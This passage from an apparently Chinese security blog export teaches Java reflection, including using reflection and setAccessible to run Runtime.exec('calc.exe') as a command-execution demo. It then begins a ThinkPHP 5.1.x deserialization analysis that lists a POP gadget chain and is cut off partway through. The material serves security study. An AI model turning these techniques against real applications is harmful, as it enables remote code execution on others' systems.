class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210829152730308.png\" alt></p>\n<p>在三种方法中我们通常使用<code>class.forName</code>方法动态加载类，而第一种<code>.class</code>，需要导入类的包，依赖性太强。第二种本身就创建了一个对象，已经不属于发射了。</p>\n<h2 id=\"获取成员属性\"><a href=\"#获取成员属性\" class=\"headerlink\" title=\"获取成员属性\"></a>获取成员属性</h2><p>在Java的<code>java.lang.reflect</code>包下具有<code>Field</code>，<code>Method</code>，<code>Method</code>，三个包，分别可以获取成员变量，成员方法，成员构造函数。</p>\n<h3 id=\"变量Field\"><a href=\"#变量Field\" class=\"headerlink\" title=\"变量Field\"></a>变量Field</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Field[] getField()：获取所有public修饰的成员变量</span><br><span class=\"line\">Field[] getDeclaredFields()：获取所有的成员变量，不考虑修饰符</span><br><span class=\"line\">Field getField(String name)：获取指定名称的 public修饰的成员变量</span><br><span class=\"line\">Field getDeclaredField(String name)：获取指定的成员变量</span><br></pre></td></tr></table></figure>\n\n<p>testDemo.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FieldTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String profession;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">int</span> age;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String number;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> sex;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            Class c1 = Class.forName(<span class=\"string\">\"com.reflect.FieldTest\"</span>); <span class=\"comment\">// 创建Class对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">            Field[] fieldArray1 = c1.getDeclaredFields(); <span class=\"comment\">//获取全部成员变量</span></span><br><span class=\"line\">            Field[] fieldArray2 = c1.getFields();<span class=\"comment\">// 获取全部public成员变量</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Field field : fieldArray1)&#123;</span><br><span class=\"line\">               System.out.println(field.getName());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Field field : fieldArray2)&#123;</span><br><span class=\"line\">               System.out.println(field.getName());</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">           Field fieldArray3 = c1.getField(<span class=\"string\">\"name\"</span>); <span class=\"comment\">// 获取指定名称的public修饰的成员变量</span></span><br><span class=\"line\">           System.out.println(fieldArray3.getName());</span><br><span class=\"line\">           System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">           Field fieldArray4 = c1.getDeclaredField(<span class=\"string\">\"number\"</span>); <span class=\"comment\">// 获取指定的成员变量</span></span><br><span class=\"line\">           System.out.println(fieldArray4.getName());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210829154144620.png\" alt=\"image-20210829154144620\"></p>\n<h3 id=\"方法Method\"><a href=\"#方法Method\" class=\"headerlink\" title=\"方法Method\"></a>方法Method</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span><br><span class=\"line\">Method getMethod(String name, 类&lt;?&gt;... parameterTypes)：返回该类所声明的public方法</span><br><span class=\"line\">Method getDeclaredMethod(String name, 类&lt;?&gt;... parameterTypes)：返回该类所声明的所有方法</span><br><span class=\"line\"></span><br><span class=\"line\">Method[] getMethods()：获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span><br><span class=\"line\">Method[] getDeclaredMethods()：获取该类中的所有方法</span><br></pre></td></tr></table></figure>\n\n<p>因为Java中支持类的重载，所以在使用<code>getMethod()</code>和<code>getDeclaredMethod()</code>不能只通过函数名来确定函数，还需要传给它<strong>需要获取的函数参数类型</strong></p>\n<p>testDemo.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.reflect;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">testDemo</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">study</span><span class=\"params\">(String s)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"学习中String...\"</span> + s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">study</span><span class=\"params\">(<span class=\"keyword\">int</span> work)</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"学习中int...\"</span> + work);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"跑步中...\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">eat</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"吃饭中...\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> String <span class=\"title\">sleep</span><span class=\"params\">(<span class=\"keyword\">int</span> age)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"睡眠中...\"</span> + age);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"sleep\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Class c = Class.forName(<span class=\"string\">\"com.reflect.testDemo\"</span>); <span class=\"comment\">// 创建Class对象</span></span><br><span class=\"line\">            Method[] methods1 = c.getDeclaredMethods(); <span class=\"comment\">// 获取所有该类中的所有方法</span></span><br><span class=\"line\">            Method[] methods2 = c.getMethods(); <span class=\"comment\">// 获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Method m:methods1) &#123;</span><br><span class=\"line\">                System.out.println(m);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Method m:methods2) &#123;</span><br><span class=\"line\">                System.out.println(m);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            Method method3 = c.getMethod(<span class=\"string\">\"study\"</span>, String.class); <span class=\"comment\">// 获取study方法</span></span><br><span class=\"line\">            System.out.println(method3);</span><br><span class=\"line\"></span><br><span class=\"line\">            Method method4 = c.getMethod(<span class=\"string\">\"study\"</span>, <span class=\"keyword\">int</span>.class);</span><br><span class=\"line\">            System.out.println(method4);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            Method method5 = c.getDeclaredMethod(<span class=\"string\">\"sleep\"</span>, <span class=\"keyword\">int</span>.class); <span class=\"comment\">// 获取sleep方法</span></span><br><span class=\"line\">            System.out.println(method5);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210829160330100.png\" alt=\"image-20210829160330100\"></p>\n<h3 id=\"构造函数Constructor\"><a href=\"#构造函数Constructor\" class=\"headerlink\" title=\"构造函数Constructor\"></a>构造函数Constructor</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Constructor&lt;?&gt;[] getConstructors()：只返回public构造函数</span><br><span class=\"line\">Constructor&lt;?&gt;[] getDeclaredConstructors()：返回所有构造函数</span><br><span class=\"line\">Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes)：匹配和参数配型相符的public构造函数</span><br><span class=\"line\">Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes)：匹配和参数配型相符的构造函数</span><br></pre></td></tr></table></figure>\n\n<p>testDemo.java：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.reflect;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">testDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">testDemo</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"无参构造函数\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">testDemo</span><span class=\"params\">(String name)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"有参构造函数\"</span> + name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">testDemo</span><span class=\"params\">(<span class=\"keyword\">boolean</span> n)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"私有构造函数\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Class c1 = Class.forName(<span class=\"string\">\"com.reflect.testDemo\"</span>);</span><br><span class=\"line\">            Constructor[] constructors1  = c1.getDeclaredConstructors();</span><br><span class=\"line\">            Constructor[] constructors2 = c1.getConstructors();</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Constructor c : constructors1) &#123;</span><br><span class=\"line\">                System.out.println(c);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Constructor c : constructors2) &#123;</span><br><span class=\"line\">                System.out.println(c);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\">            Constructor constructors3 = c1.getConstructor(String.class);</span><br><span class=\"line\">            System.out.println(constructors3);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"-------分割线---------\"</span>);</span><br><span class=\"line\">            Constructor constructors4 = c1.getDeclaredConstructor(<span class=\"keyword\">boolean</span>.class);</span><br><span class=\"line\">            System.out.println(constructors4);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210829162117147.png\" alt=\"image-20210829162117147\"></p>\n<h2 id=\"反射机制的方法\"><a href=\"#反射机制的方法\" class=\"headerlink\" title=\"反射机制的方法\"></a>反射机制的方法</h2><p>在反射中有一些极为重要的方法：</p>\n<ul>\n<li>forName：获取类的方法</li>\n<li>newInstance：实例化类的方法</li>\n<li>getMethod：获取函数的方法</li>\n<li>invoke：执行函数的方法</li>\n</ul>\n<p>反射基本Demo：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">execute</span><span class=\"params\">(String className, String methodName)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">    Class clazz = Class.forName(className);    </span><br><span class=\"line\">    clazz.getMethod(methodName).invoke(clazz.newInstance()); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>forName</code>和<code>getMethod</code>已经在之前讲过了，就不在赘述，这里主要学习<code>newInstance</code>和<code>invoke</code></p>\n<h3 id=\"invoke\"><a href=\"#invoke\" class=\"headerlink\" title=\"invoke\"></a>invoke</h3><p><code>public Object invoke(Object obj, Object... args)</code></p>\n<p>invoke方法位于Method类下，它可以传入参数，执行方法。他的第一个参数是实例化后的对象，第二个参数为<strong>传入调用方法的参数</strong>（这个参数是一个数组，参数可能有多个）。但第一个参数是不固定：</p>\n<ul>\n<li>如果这个方法是一个普通方法，第一个参数为类对象</li>\n<li>如果这个方法是静态方法，第一个参数就是类（静态方法的调用，不需要类对象的创建）</li>\n</ul>\n<h2 id=\"反射创建类对象\"><a href=\"#反射创建类对象\" class=\"headerlink\" title=\"反射创建类对象\"></a>反射创建类对象</h2><p>反射创建类对象的的过程为，先用forName获取到class对象，在用newInstance方法进行创建</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class c = Class.forName(&quot;com.reflect.MethodTest&quot;); // 创建Class对象</span><br><span class=\"line\">            Object m1 =  c.newInstance(); // 创建类对象</span><br></pre></td></tr></table></figure>\n\n<p>testDemo.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.reflect;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">testDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reflectMethod</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"HelloWorld\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Class c = Class.forName(<span class=\"string\">\"com.reflect.testDemo\"</span>); <span class=\"comment\">// 创建Class对象</span></span><br><span class=\"line\">            Object m = c.newInstance(); <span class=\"comment\">// 创建类实例对象</span></span><br><span class=\"line\">            Method method = c.getMethod(<span class=\"string\">\"reflectMethod\"</span>); <span class=\"comment\">// 获取reflectMethod方法</span></span><br><span class=\"line\">            method.invoke(m); <span class=\"comment\">// 调用类实例对象方法</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"反射构造Runtime类执行\"><a href=\"#反射构造Runtime类执行\" class=\"headerlink\" title=\"反射构造Runtime类执行\"></a>反射构造Runtime类执行</h2><p>构造Runtime类，我们首先想到的就是通过<code>newInstance()</code>来创建Runtime类的实例对象，但是会产生报错，而newInstacne报错的原因有两个：</p>\n<ul>\n<li>使用的类没有无参构造函数（class.newInstance = new class，区别再去newInstance是无参的）</li>\n<li>使用的类构造函数是私有的。</li>\n</ul>\n<p>而这里Runtime类的构造方法是private权限私有的，所以只能通过getRuntime来返回对象</p>\n<p>所以最后以反射这行<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.reflect;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">testDemo</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            Class test = Class.forName(<span class=\"string\">\"java.lang.Runtime\"</span>);</span><br><span class=\"line\">            Method exec = test.getMethod(<span class=\"string\">\"exec\"</span>,String.class);</span><br><span class=\"line\">            Method getRuntime = test.getMethod(<span class=\"string\">\"getRuntime\"</span>);</span><br><span class=\"line\">            Object runtime = getRuntime.invoke(test);</span><br><span class=\"line\">            exec.invoke(runtime,<span class=\"string\">\"calc.exe\"</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span>(Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置setAccessible-true-暴力访问权限\"><a href=\"#设置setAccessible-true-暴力访问权限\" class=\"headerlink\" title=\"设置setAccessible(true)暴力访问权限\"></a>设置setAccessible(true)暴力访问权限</h3><p>一般情况下，使用反射机制不能对类的private属性进行访问，但在一些特定的情况下，比如进行进行反序列化操作的时候，需要进行访问这些私有属性，可以调用<code>AcessibleObject</code>类中的<code>setAccessible()</code>方法来允许访问</p>\n<p>由于反射类中的Field，Method和Constructor继承自<code>AccessibleObject</code>，因此，通过在这些类上调用<code>setAccessible()</code>方法来抑制Java访问控制检查的功能。所以最后的代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.reflect;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">testDemo</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Class c1= Class.forName(<span class=\"string\">\"java.lang.Runtime\"</span>);</span><br><span class=\"line\">        Constructor m = c1.getDeclaredConstructor();</span><br><span class=\"line\">        m.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        c1.getMethod(<span class=\"string\">\"exec\"</span>, String.class).invoke(m.newInstance(), <span class=\"string\">\"calc.exe\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210829185424248.png\" alt=\"image-20210829185424248\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>反射可以利用Field、Method、Constructor获取类的属性，然后再通过newInstance和invoke来创建类对象。如果遇到私有属性可以通过getMethod来获取方法，也可以通过setAccessible来突破访问。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://xz.aliyun.com/t/9117\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/9117</a></p>\n<p><a href=\"https://xz.aliyun.com/t/7029\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/7029</a></p>\n","categories":["Summary"],"tags":["代码审计","Java"]},{"title":"TP5.1.X反序列化分析","url":"http://yoursite.com/2021/08/12/ThinkPHP5.1.X&&5.2.X/","content":"<h2 id=\"测试环境搭建\"><a href=\"#测试环境搭建\" class=\"headerlink\" title=\"测试环境搭建\"></a>测试环境搭建</h2><p><strong>反序列化漏洞都是基于二次开发形成</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.1.X：</span><br><span class=\"line\">composer create-project --prefer-dist topthink/think=5.1.35 tp5.1.35</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820162305063.png\" alt=\"image-20210820162305063\"></p>\n<h2 id=\"5-1-X\"><a href=\"#5-1-X\" class=\"headerlink\" title=\"5.1.X\"></a>5.1.X</h2><p>POP链：</p>\n<p><code>\\thinkphp\\library\\think\\process\\pipes\\Windows.php::__destruct()</code> -&gt; <code>\\thinkphp\\library\\think\\process\\pipes\\Windows.php::removeFiles()</code> -&gt; <code>\\thinkphp\\library\\think\\model\\concern\\Conversion.php::__toString()</code> -&gt; <code>\\thinkphp\\library\\think\\model\\concern\\Conversion.php::__toJson()</code> -&gt; <code>\\thinkphp\\library\\think\\model\\concern\\Conversion.php::__toArray()</code> -&gt; <code>\\thinkphp\\library\\think\\Request.php::__call()</code> -&gt; <code>\\thinkphp\\library\\think\\Request.php::isAjax()</code> -&gt; <code>\\thinkphp\\library\\think\\Request.php::param()</code> -&gt; <code>\\thinkphp\\library\\think\\Request.php::input()</code> -&gt; 